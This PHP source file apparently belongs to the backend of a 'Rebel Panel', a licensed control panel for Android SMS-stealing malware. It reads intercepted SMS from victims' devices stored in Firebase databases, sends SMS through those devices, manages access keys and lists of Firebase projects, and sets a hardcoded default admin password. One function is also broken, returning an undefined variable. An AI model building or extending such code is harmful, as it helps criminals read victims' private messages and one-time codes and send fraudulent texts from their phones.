<?php
/**
 * Rebel Panel — shared key/session helpers for mobile.php and bot integrations.
 */

declare(strict_types=1);

function rebel_keys_file(): string
{
    return __DIR__ . '/rebel_keys.json';
}

function rebel_json_out(array $payload, int $code = 200): void
{
    if (!headers_sent()) {
        http_response_code($code);
        header('Content-Type: application/json; charset=UTF-8');
        header('Cache-Control: no-store');
    }
    echo json_encode($payload, JSON_UNESCAPED_UNICODE);
    exit;
}

function rebel_keys_load(): array
{
    $file = rebel_keys_file();
    if (!is_file($file)) {
        return ['keys' => [], 'sessions' => []];
    }
    $raw = file_get_contents($file);
    if ($raw === false || trim($raw) === '') {
        return ['keys' => [], 'sessions' => []];
    }
    $data = json_decode($raw, true);
    if (!is_array($data)) {
        return ['keys' => [], 'sessions' => []];
    }
    if (!isset($data['keys']) || !is_array($data['keys'])) {
        $data['keys'] = [];
    }
    if (!isset($data['sessions']) || !is_array($data['sessions'])) {
        $data['sessions'] = [];
    }
    return $data;
}

function rebel_keys_save(array $data): void
{
    if (!isset($data['keys']) || !is_array($data['keys'])) {
        $data['keys'] = [];
    }
    if (!isset($data['sessions']) || !is_array($data['sessions'])) {
        $data['sessions'] = [];
    }
    file_put_contents(
        rebel_keys_file(),
        json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
        LOCK_EX
    );
}

function rebel_norm_key(string $key): string
{
    return strtoupper(preg_replace('/[^A-Z0-9\-]/', '', trim($key)));
}

function rebel_key_infer_type(string $key): string
{
    $key = rebel_norm_key($key);
    if (str_starts_with($key, 'APK-') || str_starts_with($key, 'APK')) {
        return 'apk';
    }
    if (str_starts_with($key, 'WEB-') || str_starts_with($key, 'WEB')) {
        return 'web';
    }
    return 'web';
}

function rebel_key_allowed_for_client(array $row, string $client): bool
{
    $type = strtolower((string)($row['type'] ?? 'web'));
    $client = strtolower($client);
    if ($type === 'both' || $type === 'all') {
        return true;
    }
    return $type === $client;
}

function rebel_key_login_allowed(array $data, string $key): bool
{
    $key = rebel_norm_key($key);
    $row = $data['keys'][$key] ?? null;
    if (!$row || !is_array($row)) {
        return false;
    }
    if (!empty($row['revoked'])) {
        return false;
    }
    $expires = (int)($row['expires'] ?? 0);
    if ($expires > 0 && $expires < time()) {
        return false;
    }
    $maxUses = (int)($row['max_uses'] ?? 1);
    $uses = (int)($row['uses'] ?? 0);
    if (!empty($row['used']) || ($maxUses > 0 && $uses >= $maxUses)) {
        return false;
    }
    return true;
}

function rebel_consume_key(array &$data, string $key): void
{
    $key = rebel_norm_key($key);
    if (!isset($data['keys'][$key]) || !is_array($data['keys'][$key])) {
        return;
    }
    $data['keys'][$key]['uses'] = (int)($data['keys'][$key]['uses'] ?? 0) + 1;
    $maxUses = (int)($data['keys'][$key]['max_uses'] ?? 1);
    if ($maxUses > 0 && $data['keys'][$key]['uses'] >= $maxUses) {
        $data['keys'][$key]['used'] = true;
    }
}

function rebel_create_session(array &$data, string $key, bool $remember = false): array
{
    $token = bin2hex(random_bytes(24));
    $ttl = $remember ? 86400 * 30 : 86400 * 7;
    $expires = time() + $ttl;
    $hash = hash('sha256', $token);
    $data['sessions'][$hash] = [
        'key' => rebel_norm_key($key),
        'created' => time(),
        'expires' => $expires,
    ];
    return ['token' => $token, 'expires' => $expires];
}

function rebel_session_valid(array &$data, string $token): ?array
{
    $token = trim($token);
    if ($token === '') {
        return null;
    }
    $hash = hash('sha256', $token);
    $row = $data['sessions'][$hash] ?? null;
    if (!$row || !is_array($row)) {
        return null;
    }
    $expires = (int)($row['expires'] ?? 0);
    if ($expires > 0 && $expires < time()) {
        unset($data['sessions'][$hash]);
        return null;
    }
    return $row;
}

function rebel_create_key(string $type = 'web', int $maxUses = 1, int $ttlDays = 30): string
{
    $prefix = strtoupper($type) === 'APK' ? 'APK' : 'WEB';
    $key = $prefix . '-' . strtoupper(substr(bin2hex(random_bytes(4)), 0, 8));
    $data = rebel_keys_load();
    $data['keys'][$key] = [
        'type' => strtolower($type) === 'apk' ? 'apk' : 'web',
        'uses' => 0,
        'max_uses' => max(1, $maxUses),
        'used' => false,
        'created' => time(),
        'expires' => $ttlDays > 0 ? time() + ($ttlDays * 86400) : 0,
    ];
    rebel_keys_save($data);
    return $key;
}

/** Resolve Firebase auth key — same as rebel.py public DB fallback (URL as key). */
function rebel_firebase_auth_key(string $url, string $key): string
{
    $key = trim($key);
    if ($key !== '') {
        return $key;
    }
    return rtrim($url, '/');
}

/** Detect Firebase schema from shallow root keys (matches panel discoverInstance). */
function rebel_detect_schema(?array $roots, string $url = ''): string
{
    if (is_array($roots)) {
        if (array_key_exists('messages', $roots)) {
            return 'rabel';
        }
        if (array_key_exists('clients', $roots)) {
            return 'rabel';
        }
        if (array_key_exists('devices', $roots) || array_key_exists('devices_status', $roots)) {
            return 'spinplay';
        }
    }
    if ($url !== '' && stripos($url, 'rabel') !== false) {
        return 'rabel';
    }
    return 'spinplay';
}

/** All SMS read paths — rebel.py uses messages/{id}; SpinPlay uses devices/.../all_sms */
function rebel_sms_paths_for_device(string $deviceId, string $schema = 'rabel', string $deviceNode = 'clients'): array
{
    $id = trim($deviceId);
    if ($id === '') {
        return [];
    }

    $node = $deviceNode !== '' ? $deviceNode : 'clients';
    $bases = array_values(array_unique([$node, 'clients', 'devices', 'devices_status']));
    $paths = [];

    // Rabel / rebel.py primary path first
    $paths[] = 'messages/' . $id;

    foreach ($bases as $n) {
        if ($n === '') {
            continue;
        }
        $paths[] = $n . '/' . $id . '/all_sms';
        $paths[] = $n . '/' . $id . '/new_sms';
        $paths[] = $n . '/' . $id . '/sms';
        $paths[] = $n . '/' . $id . '/messages';
    }

    if ($schema === 'rabel') {
        // Keep messages/ first; already added
    } elseif ($schema === 'spinplay') {
        // Prefer device-node paths before global messages/
        $preferred = [];
        foreach ($bases as $n) {
            if ($n === '') {
                continue;
            }
            $preferred[] = $n . '/' . $id . '/all_sms';
            $preferred[] = $n . '/' . $id . '/new_sms';
            $preferred[] = $n . '/' . $id . '/sms';
            $preferred[] = $n . '/' . $id . '/messages';
        }
        $preferred[] = 'messages/' . $id;
        $paths = array_values(array_unique($preferred));
    }

    return array_values(array_unique($paths));
}

/** Send paths with payload type — rebel.py: clients/{id}/webhookEvent/sendSms */
function rebel_send_paths_for_device(string $deviceId, string $schema = 'rabel', string $deviceNode = 'clients'): array
{
    $id = trim($deviceId);
    if ($id === '') {
        return [];
    }

    $out = [];
    $node = $deviceNode !== '' ? $deviceNode : 'clients';

    if ($schema === 'spinplay') {
        foreach (array_values(array_unique([$node, 'devices', 'clients'])) as $n) {
            $out[] = ['path' => $n . '/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay'];
        }
        $out[] = ['path' => 'clients/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
    } else {
        foreach (array_values(array_unique(['clients', $node])) as $n) {
            if ($n === '') {
                continue;
            }
            $out[] = ['path' => $n . '/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
        }
        $out[] = ['path' => 'devices/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay'];
    }

    return $out;
}

function rebel_send_payload_for_type(string $type, int $sim, string $to, string $message): array
{
    $sim = max(1, $sim);
    if ($type === 'spinplay') {
        return [
            'to' => $to,
            'message' => $message,
            'sim' => $sim - 1,
        ];
    }

    return [
        'from' => $sim,
        'to' => $to,
        'message' => $message,
        'isSended' => false,
    ];
}

/** Same as rebel.py normalize_phone() */
function rebel_normalize_phone(string $raw): string
{
    $clean = preg_replace('/\D/', '', $raw);
    if (strlen($clean) === 10) {
        return $clean;
    }
    if (strlen($clean) > 10 && str_starts_with($clean, '91')) {
        return substr($clean, -10);
    }
    return $clean;
}

/** Same as rebel.py firebase_req() */
function rebel_firebase_req(string $method, string $url, string $key, string $path, ?array $data = null): ?array
{
    $authKey = rebel_firebase_auth_key($url, $key);
    $full = rtrim($url, '/') . '/' . ltrim($path, '/') . '.json';
    if ($authKey !== '') {
        $full .= '?auth=' . rawurlencode($authKey);
    }

    $headers = ['Content-Type: application/json', 'Accept: application/json'];
    $body = $data !== null ? json_encode($data, JSON_UNESCAPED_UNICODE) : null;

    if (function_exists('curl_init')) {
        $ch = curl_init($full);
        curl_setopt_array($ch, [
            CURLOPT_CUSTOMREQUEST => strtoupper($method),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 12,
            CURLOPT_HTTPHEADER => $headers,
        ]);
        if ($body !== null) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }
        $raw = curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($code === 200 || $code === 201) {
            if ($raw === false || trim($raw) === '' || trim($raw) === 'null') {
                return [];
            }
            $parsed = json_decode($raw, true);
            return is_array($parsed) ? $parsed : [];
        }
        return null;
    }

    $opts = [
        'http' => [
            'method' => strtoupper($method),
            'timeout' => 12,
            'header' => implode("\r\n", $headers) . "\r\n",
            'ignore_errors' => true,
        ],
    ];
    if ($body !== null) {
        $opts['http']['content'] = $body;
    }
    $raw = @file_get_contents($full, false, stream_context_create($opts));
    if ($raw === false) {
        return null;
    }
    global $http_response_header;
    $status = 0;
    if (!empty($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) {
        $status = (int) $m[1];
    }
    if ($status !== 200 && $status !== 201) {
        return null;
    }
    if (trim($raw) === '' || trim($raw) === 'null') {
        return [];
    }
    $parsed = json_decode($raw, true);
    return is_array($parsed) ? $parsed : [];
}

function rebel_sms_as_list($raw): array
{
    if (!is_array($raw)) {
        return [];
    }
    $out = [];
    foreach ($raw as $v) {
        if (is_array($v)) {
            $out[] = $v;
        }
    }
    return $out;
}

function rebel_sms_to_ms($v): int
{
    if ($v === null || $v === '') {
        return 0;
    }
    if (is_int($v) && $v > 0) {
        return $v < 1000000000000 ? $v * 1000 : $v;
    }
    if (is_float($v) && $v > 0) {
        $n = (int) $v;
        return $n < 1000000000000 ? $n * 1000 : $n;
    }
    if (is_string($v)) {
        if (is_numeric($v) && (float) $v > 0) {
            $n = (float) $v;
            return $n < 1000000000000 ? (int) ($n * 1000) : (int) $n;
        }
        $t = strtotime($v);
        if ($t !== false) {
            return $t * 1000;
        }
    }
    return 0;
}

function rebel_sms_msg_time(array $m): int
{
    $keys = ['date', 'timestamp', 'dateTime', 'datetime', 'time', 'received_at', 'sent_at', 'created_at', 'receivedAt', 'sentAt', 'sms_time', 'msg_time', 'last_modified', 'received_time', 'sent_time', 'id'];
    foreach ($keys as $k) {
        $ms = rebel_sms_to_ms($m[$k] ?? null);
        if ($ms > 0) {
            return $ms;
        }
    }
    $sk = rebel_sms_to_ms($m['_sortKey'] ?? null);
    if ($sk > 0) {
        return $sk;
    }
    return rebel_sms_to_ms($m['date_readable'] ?? null);
}

/** Normalize SMS record — same fields as rebel.py + panel normalizeSms() */
function rebel_sms_normalize($m): ?array
{
    if (!is_array($m)) {
        return null;
    }
    $body = trim((string)($m['body'] ?? $m['message'] ?? $m['text'] ?? $m['content'] ?? $m['msg'] ?? ''));
    if ($body === '') {
        return null;
    }
    $ts = rebel_sms_msg_time($m);
    return [
        'address' => (string)($m['address'] ?? $m['sender'] ?? $m['from'] ?? $m['number'] ?? $m['originatingAddress'] ?? '?'),
        'body' => $body,
        'date_readable' => (string)($m['date_readable'] ?? $m['dateTime'] ?? $m['date_time'] ?? $m['time'] ?? $m['date'] ?? '—'),
        'type' => strtolower((string)($m['type'] ?? $m['direction'] ?? $m['sms_type'] ?? 'inbox')),
        'ts' => $ts,
        'device_id' => (string)($m['device_id'] ?? $m['deviceId'] ?? $m['client_id'] ?? $m['clientId'] ?? $m['dev_id'] ?? $m['devId'] ?? ''),
    ];
}

function rebel_sms_belongs_to_device(array $sms, string $deviceId, string $compositeId = ''): bool
{
    $did = trim((string)($sms['device_id'] ?? ''));
    if ($did === '') {
        return true;
    }
    if ($did === $deviceId || ($compositeId !== '' && $did === $compositeId)) {
        return true;
    }
    return false;
}

function rebel_merge_sms_lists(array ...$lists): array
{
    $merged = [];
    $seen = [];
    foreach ($lists as $list) {
        foreach ($list as $s) {
            if (!is_array($s)) {
                continue;
            }
            $key = ($s['address'] ?? '?') . '|' . ($s['ts'] ?? 0) . '|' . substr((string)($s['body'] ?? ''), 0, 80);
            if (isset($seen[$key])) {
                continue;
            }
            $seen[$key] = true;
            $merged[] = $s;
        }
    }
    usort($merged, static fn($a, $b) => ($b['ts'] ?? 0) <=> ($a['ts'] ?? 0));
    return $merged;
}

/**
 * Fetch SMS for device — rebel.py messages/{id} + SpinPlay fallbacks.
 */
function rebel_fetch_sms_for_device(
    string $url,
    string $key,
    string $deviceId,
    string $schema = 'rabel',
    string $deviceNode = 'clients',
    string $compositeId = ''
): array {
    if ($deviceId === '') {
        return ['ok' => false, 'error' => 'Device id required', 'messages' => []];
    }
    if ($url === '') {
        return ['ok' => false, 'error' => 'Firebase URL missing', 'messages' => []];
    }

    $authKey = rebel_firebase_auth_key($url, $key);
    $paths = rebel_sms_paths_for_device($deviceId, $schema, $deviceNode);
    $all = [];

    foreach ($paths as $path) {
        $data = rebel_firebase_req('GET', $url, $authKey, $path);
        if ($data === null) {
            continue;
        }
        $batch = [];
        foreach (rebel_sms_as_list($data) as $raw) {
            $norm = rebel_sms_normalize($raw);
            if ($norm === null) {
                continue;
            }
            if (!rebel_sms_belongs_to_device($norm, $deviceId, $compositeId)) {
                continue;
            }
            $batch[] = $norm;
        }
        if (!$batch) {
            continue;
        }
        $all = rebel_merge_sms_lists($all, $batch);
        if (str_starts_with($path, 'messages/') || str_contains($path, '/all_sms')) {
            break;
        }
    }
    return [
        'ok' => true,
        'messages' => $messages,
        'count' => count($messages),
        'schema' => $schema,
    ];
}

/**
 * Send SMS to device — same payload/path as rebel.py with multi-path fallback.
 */
function rebel_send_sms_to_device(
    string $url,
    string $key,
    string $deviceId,
    int $sim,
    string $to,
    string $message,
    string $schema = 'rabel',
    string $deviceNode = 'clients'
): array {
    $to = rebel_normalize_phone($to);
    if ($deviceId === '' || $to === '' || $message === '') {
        return ['ok' => false, 'error' => 'Device, number and message required'];
    }
    if ($url === '') {
        return ['ok' => false, 'error' => 'Firebase URL missing'];
    }

    $sim = max(1, $sim);
    $authKey = rebel_firebase_auth_key($url, $key);
    $attempts = rebel_send_paths_for_device($deviceId, $schema, $deviceNode);
    $lastError = 'Failed to send SMS — device offline or Firebase error';

    foreach ($attempts as $attempt) {
        $path = (string)($attempt['path'] ?? '');
        $type = (string)($attempt['type'] ?? 'rabel');
        if ($path === '') {
            continue;
        }
        $payload = rebel_send_payload_for_type($type, $sim, $to, $message);
        $res = rebel_firebase_req('PUT', $url, $authKey, $path, $payload);
        if ($res !== null) {
            return [
                'ok' => true,
                'message' => 'SMS sent to device',
                'sim' => $sim,
                'to' => $to,
                'path' => $path,
                'schema' => $type,
            ];
        }
        $lastError = 'Failed via ' . $path;
    }

    return ['ok' => false, 'error' => $lastError];
}

/** Shared Firebase project list — admin.php writes, k.php reads */
function rebel_firebase_file(): string
{
    return __DIR__ . '/rebel_firebase.json';
}

function rebel_admin_file(): string
{
    return __DIR__ . '/rebel_admin.json';
}

function rebel_admin_load(): array
{
    $file = rebel_admin_file();
    if (!is_file($file)) {
        $hash = password_hash('rebeladmin', PASSWORD_DEFAULT);
        $data = ['password_hash' => $hash, 'created' => time()];
        file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
        return $data;
    }
    $raw = file_get_contents($file);
    $data = json_decode($raw ?: '{}', true);
    return is_array($data) ? $data : [];
}

function rebel_admin_check_password(string $password): bool
{
    $data = rebel_admin_load();
    $hash = (string)($data['password_hash'] ?? '');
    if ($hash === '') {
        return false;
    }
    return password_verify($password, $hash);
}

function rebel_admin_session_start(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start([
            'cookie_httponly' => true,
            'cookie_samesite' => 'Lax',
        ]);
    }
}

function rebel_admin_logged_in(): bool
{
    rebel_admin_session_start();
    return !empty($_SESSION['rebel_admin_ok']);
}

function rebel_admin_login(string $password): bool
{
    if (!rebel_admin_check_password($password)) {
        return false;
    }
    rebel_admin_session_start();
    $_SESSION['rebel_admin_ok'] = time();
    return true;
}

function rebel_admin_logout(): void
{
    rebel_admin_session_start();
    unset($_SESSION['rebel_admin_ok']);
}

function rebel_firebase_load(): array
{
    $file = rebel_firebase_file();
    if (!is_file($file)) {
        return ['updated' => 0, 'projects' => []];
    }
    $raw = file_get_contents($file);
    if ($raw === false || trim($raw) === '') {
        return ['updated' => 0, 'projects' => []];
    }
    $data = json_decode($raw, true);
    if (!is_array($data)) {
        return ['updated' => 0, 'projects' => []];
    }
    if (!isset($data['projects']) || !is_array($data['projects'])) {
        $data['projects'] = [];
    }
    if (!isset($data['updated'])) {
        $data['updated'] = 0;
    }
    return $data;
}

function rebel_firebase_save(array $data): void
{
    if (!isset($data['projects']) || !is_array($data['projects'])) {
        $data['projects'] = [];
    }
    $data['updated'] = time();
    file_put_contents(
        rebel_firebase_file(),
        json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
        LOCK_EX
    );
}

function rebel_firebase_norm_url(string $url): string
{
    return rtrim(trim($url), '/');
}

function rebel_firebase_norm_project(array $row): ?array
{
    $name = trim((string)($row['name'] ?? ''));
    $url = rebel_firebase_norm_url((string)($row['databaseURL'] ?? $row['database_url'] ?? $row['url'] ?? ''));
    if ($name === '' || $url === '') {
        return null;
    }
    $id = trim((string)($row['id'] ?? ''));
    if ($id === '') {
        $id = 'fb_' . substr(hash('sha256', $url), 0, 12);
    }
    $secret = trim((string)($row['secret'] ?? $row['key'] ?? $row['auth_key'] ?? $row['databaseSecret'] ?? ''));
    $apiKey = trim((string)($row['apiKey'] ?? $row['api_key'] ?? ''));
    $schema = strtolower(trim((string)($row['schema'] ?? '')));
    if ($schema === '') {
        $schema = (stripos($url, 'rabel') !== false) ? 'rabel' : 'spinplay';
    }

    return [
        'id' => $id,
        'name' => $name,
        'databaseURL' => $url,
        'secret' => $secret,
        'key' => $secret,
        'apiKey' => $apiKey,
        'schema' => $schema,
        'created' => (int)($row['created'] ?? time()),
    ];
}

function rebel_firebase_list(): array
{
    return rebel_firebase_load()['projects'];
}

function rebel_firebase_add(array $input): array
{
    $proj = rebel_firebase_norm_project($input);
    if ($proj === null) {
        return ['ok' => false, 'error' => 'Project name and Firebase URL required'];
    }

    $data = rebel_firebase_load();
    foreach ($data['projects'] as $existing) {
        if (rebel_firebase_norm_url((string)($existing['databaseURL'] ?? '')) === $proj['databaseURL']) {
            return ['ok' => false, 'error' => 'This Firebase URL is already added'];
        }
    }

    $data['projects'][] = $proj;
    rebel_firebase_save($data);

    return ['ok' => true, 'project' => $proj, 'updated' => $data['updated']];
}

function rebel_firebase_delete(string $id): array
{
    $id = trim($id);
    if ($id === '') {
        return ['ok' => false, 'error' => 'Project id required'];
    }

    $data = rebel_firebase_load();
    $before = count($data['projects']);
    $data['projects'] = array_values(array_filter(
        $data['projects'],
        static fn($p) => is_array($p) && (string)($p['id'] ?? '') !== $id
    ));

    if (count($data['projects']) === $before) {
        return ['ok' => false, 'error' => 'Project not found'];
    }

    rebel_firebase_save($data);
    return ['ok' => true, 'updated' => $data['updated']];
}

/** Public read + admin write API for Firebase projects */
function rebel_firebase_api_handle(bool $requireAdminForWrite = true): void
{
    $method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');

    if ($method === 'GET' && isset($_GET['rebel_firebase_api'])) {
        $data = rebel_firebase_load();
        rebel_json_out([
            'ok' => true,
            'updated' => (int)($data['updated'] ?? 0),
            'projects' => array_values($data['projects']),
            'count' => count($data['projects']),
        ]);
    }

    if ($method !== 'POST') {
        rebel_json_out(['ok' => false, 'error' => 'Method not allowed'], 405);
    }

    if ($requireAdminForWrite && !rebel_admin_logged_in()) {
        rebel_json_out(['ok' => false, 'error' => 'Admin login required'], 401);
    }

    $body = json_decode(file_get_contents('php://input') ?: '{}', true);
    if (!is_array($body)) {
        $body = $_POST;
    }
    if (!is_array($body)) {
        $body = [];
    }

    $action = strtolower(trim((string)($body['action'] ?? $_GET['action'] ?? '')));

    if ($action === 'add') {
        $result = rebel_firebase_add($body);
        rebel_json_out($result, !empty($result['ok']) ? 200 : 400);
    }

    if ($action === 'delete') {
        $result = rebel_firebase_delete((string)($body['id'] ?? ''));
        rebel_json_out($result, !empty($result['ok']) ? 200 : 400);
    }

    if ($action === 'list') {
        $data = rebel_firebase_load();
        rebel_json_out([
            'ok' => true,
            'updated' => (int)($data['updated'] ?? 0),
            'projects' => array_values($data['projects']),
        ]);
    }

    rebel_json_out(['ok' => false, 'error' => 'Unknown action'], 400);
}

function rebel_sms_token_file(): string
{
    return __DIR__ . '/rebel_sms_token.json';
}

function rebel_sms_token_load(): array
{
    $file = rebel_sms_token_file();
    if (!is_file($file)) {
        return ['enabled' => false, 'device_id' => '', 'database_url' => '', 'fb_name' => ''];
    }
    $raw = file_get_contents($file);
    if ($raw === false || trim($raw) === '') {
        return ['enabled' => false, 'device_id' => '', 'database_url' => '', 'fb_name' => ''];
    }
    $data = json_decode($raw, true);
    if (!is_array($data)) {
        return ['enabled' => false, 'device_id' => '', 'database_url' => '', 'fb_name' => ''];
    }
    return $data;
}

function rebel_sms_token_save(array $config): void
{
    file_put_contents(
        rebel_sms_token_file(),
        json_encode($config, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
        LOCK_EX
    );
}

function rebel_sms_token_api_handle(): void
{
    $body = json_decode(file_get_contents('php://input') ?: '{}', true);
    if (!is_array($body)) {
        $body = $_POST;
    }
    if (!is_array($body)) {
        $body = [];
    }

    $action = strtolower(trim((string)($body['action'] ?? 'get')));
    $config = rebel_sms_token_load();

    if ($action === 'get') {
        rebel_json_out(['ok' => true, 'config' => $config]);
    }

    if ($action === 'save') {
        $config['enabled'] = !empty($body['enabled']);
        if (array_key_exists('device_id', $body)) {
            $config['device_id'] = trim((string)$body['device_id']);
        }
        if (array_key_exists('database_url', $body)) {
            $config['database_url'] = trim((string)$body['database_url']);
        }
        if (array_key_exists('fb_name', $body)) {
            $config['fb_name'] = trim((string)$body['fb_name']);
        }
        $config['updated'] = time();
        rebel_sms_token_save($config);
        rebel_json_out(['ok' => true, 'config' => $config]);
    }

    rebel_json_out(['ok' => false, 'error' => 'Unknown action'], 400);
}
